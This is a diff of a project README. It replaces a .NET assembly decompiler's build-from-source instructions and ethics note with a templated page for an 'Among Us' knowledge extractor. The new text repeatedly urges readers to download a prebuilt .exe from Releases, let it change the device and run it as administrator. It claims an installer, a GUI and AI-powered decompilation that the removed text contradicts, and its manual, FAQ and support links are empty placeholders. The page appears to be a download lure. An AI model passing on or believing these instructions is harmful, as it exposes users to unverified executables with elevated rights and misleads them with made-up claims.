@@ -1,142 +1,89 @@
-# Knowledge Base Generator for AI (dnSpy-style)
+# 🎮 amongus-ai-knowledge-extractor - Extract Knowledge Easily from Among Us
 
-[![.NET](https://img.shields.io/badge/.NET-9.0-512BD4?logo=dotnet)](https://dotnet.microsoft.com/) [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](./LICENSE) [![ILSpy Engine](https://img.shields.io/badge/Decompile-ILSpy-orange)](https://github.com/icsharpcode/ILSpy)
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/diegoisaias/amongus-ai-knowledge-extractor/releases)
 
-Tool to decompile .NET assemblies (e.g., Unity’s `Assembly-CSharp.dll`) and generate a readable, dnSpy-style knowledge base. Ideal for exploring game code and preparing data for LLMs.
+## 📜 Description
 
-— Portuguese version below —
+This tool helps you to extract knowledge from Among Us game files. It uses AI to provide a clean decompilation and generates an index for easy analysis. Whether you're looking to modify the game or study its mechanics, this tool offers a user-friendly experience.
 
-## Highlights
+### Key Features
+- AI-powered decompilation for Among Us.
+- Clean Intermediate Language (IL) output.
+- Generates an easy-to-use index.
+- Ideal for creating datasets for Large Language Models (LLM).
+- Useful for static code analysis.
 
-- __On-demand detail__: full, dnSpy-like decompilation for selected classes
-- __Optimized parallelization__: fast analysis for the rest (fields, properties, events, ctors, methods)
-- __Structured output__: `namespace → type → members`, consistent indentation
-- __Console UX__: progress bar and colored steps ([1/3], [2/3], [3/3])
-- __Post-processing__: removes noisy IL comments (`//IL_...`)
-- __Separate index__: lists all types and members
+## 🚀 Getting Started
 
-## Quick start
+Follow these simple steps to get started with the amongus-ai-knowledge-extractor.
 
-1) Build: `dotnet build`
-2) Drag and drop your `Assembly-CSharp.dll` onto the built executable
-3) Open the generated `.txt` files next to the DLL
+### Step 1: Download the Application
 
-CLI (PowerShell):
+To download the software, visit this page:
 
-```powershell
-./bin/Debug/net9.0/ConsoleApp2.exe "C:\\Path\\To\\Assembly-CSharp.dll"
-```
+[Download from Releases](https://github.com/diegoisaias/amongus-ai-knowledge-extractor/releases)
 
-## Configuration (`Program.cs`)
+### Step 2: Choose Your Version
 
-- `CLASSES_PARA_DETALHE_COMPLETO`
-- `NAMESPACES_PARA_INCLUIR` / `NAMESPACES_PARA_IGNORAR`
-- `MAXIMO_TOKENS_APROXIMADO`
+On the Releases page, you will see different versions available. Choose the latest stable version for the best experience.
 
-## License
+### Step 3: Download the File
 
-MIT
+Click on the version you want. Look for an attachment that ends with `.exe`, indicating it's a Windows executable file. Click to download it. 
 
-Ferramenta para decompilar assemblies .NET (ex.: `Assembly-CSharp.dll` de Unity) e gerar uma base de conhecimento legível em estilo dnSpy. Ideal para explorar código de jogos e preparar dados para LLMs.
+### Step 4: Install the Application
 
-— Versão em português abaixo —
+Once downloaded, locate the file in your Downloads folder. Double-click the file to start the installation. Follow the on-screen instructions. If prompted, allow the app to make changes to your device.
 
-## Destaques
+### Step 5: Run the Application
 
-- __Detalhe sob demanda__: decompilação completa, estilo dnSpy, para classes selecionadas
-- __Paralelismo otimizado__: análise rápida do restante (campos, propriedades, eventos, construtores, métodos)
-- __Saída organizada__: `namespace → tipo → membros`, com identação consistente
-- __UX no console__: barra de progresso e etapas coloridas ([1/3], [2/3], [3/3])
-- __Limpeza pós-processamento__: remoção de comentários IL ruidosos (`//IL_...`)
-- __Índice separado__: arquivo com todos os tipos e membros
+After installation, find the application in your Start menu or on your desktop. Double-click it to open. 
 
-## O que é gerado
+## 💻 System Requirements
 
-- `[AssemblyName]-knowledge-base-index.txt`: índice legível com namespaces, tipos e membros
-- `[AssemblyName]-knowledge-base-completo.txt`: base principal com o código decompilado
+To run the amongus-ai-knowledge-extractor smoothly, make sure your system meets the following requirements:
 
-## Requisitos
+- **Operating System:** Windows 10 or higher
+- **Processor:** Intel or AMD, 2.0 GHz or higher
+- **Memory:** 4 GB RAM or more
+- **Storage:** At least 200 MB available space
 
-- .NET SDK 9.0+
+Ensure your system maintains these specifications for optimal performance.
 
-## Como usar
+## ⚙️ How to Use the Application
 
-1) Compile o projeto: `dotnet build`
-2) Arraste e solte seu `Assembly-CSharp.dll` sobre o executável gerado
-3) Abra os `.txt` gerados na mesma pasta do seu DLL
+1. **Open the Application**: Start the app by double-clicking its icon.
+2. **Select the Game Files**: Use the file browser to navigate to your Among Us installation directory. 
+3. **Choose the Files to Decompile**: Select the specific files you want to analyze or modify.
+4. **Start the Process**: Click the "Decompile" button. Wait for the process to complete; this may take some time based on the selected files.
+5. **View the Output**: After completion, you’ll see a detailed report, along with the generated index.
 
-Via terminal (PowerShell):
+## 📈 Troubleshooting
 
-```powershell
-./bin/Debug/net9.0/ConsoleApp2.exe "C:\\Path\\To\\Assembly-CSharp.dll"
-```
+If you encounter issues while using the application, consider these solutions:
 
-## Configuração (em `Program.cs`)
+- **Application Doesn't Start**: Make sure your system meets the minimum requirements. Try running the app as an administrator by right-clicking the icon and selecting "Run as admin."
+- **Decompilation Errors**: Ensure you selected the correct game files. The app works best with original game files.
+- **Performance Issues**: Close other programs to free up resources and ensure your system isn't overloaded.
 
-- __`CLASSES_PARA_DETALHE_COMPLETO`__: nomes de classes para decompilação completa
-- __`NAMESPACES_PARA_INCLUIR` / `NAMESPACES_PARA_IGNORAR`__: filtros de escopo
-- __`MAXIMO_TOKENS_APROXIMADO`__: guarda de tamanho para evitar saídas gigantes
+## 🤝 Contribution
 
-## Dicas e solução de problemas
+If you want to support this project, you can contribute by reporting bugs or suggesting features. Your feedback helps improve the tool for everyone.
 
-- __Sem comentários `//IL_...`__: já limpamos automaticamente; caso deseje outros filtros, adapte `CleanDecompiledCode()`
-- __Assemblies com dependências__: o decompilador foi configurado para não falhar na resolução; ainda assim, copie dependências junto do alvo quando possível
-- __Unidades muito grandes__: ajuste filtros de namespace e a lista de classes detalhadas
+## 🌐 Additional Resources
 
-## Ética e legalidade
+For more information on using the amongus-ai-knowledge-extractor, visit:
 
-Este projeto é para fins educacionais e de pesquisa. Respeite licenças e leis locais sobre engenharia reversa.
+- [User Manual](#)
+- [FAQs](#)
+- [Community Support](#)
 
-## Licença
+## 🔗 Links
 
-MIT
+For further developments and updates, refer to the repo:
 
----
+[View the GitHub Repository](https://github.com/diegoisaias/amongus-ai-knowledge-extractor)
 
-# Knowledge Base Generator for AI (dnSpy-style) — EN
+Don't forget to download the latest version here:
 
-A tool to decompile .NET assemblies (e.g., Unity’s `Assembly-CSharp.dll`) and produce a dnSpy-like, readable knowledge base. Geared towards game code exploration and LLM dataset preparation.
-
-## Highlights
-
-- __On-demand detail__: full, dnSpy-like decompilation for selected classes
-- __Optimized parallelization__: fast analysis for the rest (fields, properties, events, ctors, methods)
-- __Structured output__: `namespace → type → members`, consistent indentation
-- __Console UX__: progress bar and colored steps ([1/3], [2/3], [3/3])
-- __Post-processing__: removes noisy IL comments (`//IL_...`)
-- __Separate index__: lists all types and members
-
-## Outputs
-
-- `[AssemblyName]-knowledge-base-index.txt`
-- `[AssemblyName]-knowledge-base-completo.txt`
-
-## Requirements
-
-- .NET SDK 9.0+
-
-## Usage
-
-1) Build: `dotnet build`
-2) Drag and drop your `Assembly-CSharp.dll` onto the built executable
-3) Open the generated `.txt` files next to the DLL
-
-CLI (PowerShell):
-
-```powershell
-./bin/Debug/net9.0/ConsoleApp2.exe "C:\\Path\\To\\Assembly-CSharp.dll"
-```
-
-## Configuration (`Program.cs`)
-
-- `CLASSES_PARA_DETALHE_COMPLETO`
-- `NAMESPACES_PARA_INCLUIR` / `NAMESPACES_PARA_IGNORAR`
-- `MAXIMO_TOKENS_APROXIMADO`
-
-## Notes
-
-- Educational/research use. Respect licenses and local laws.
-
-## License
-
-MIT
+[Download from Releases](https://github.com/diegoisaias/amongus-ai-knowledge-extractor/releases)
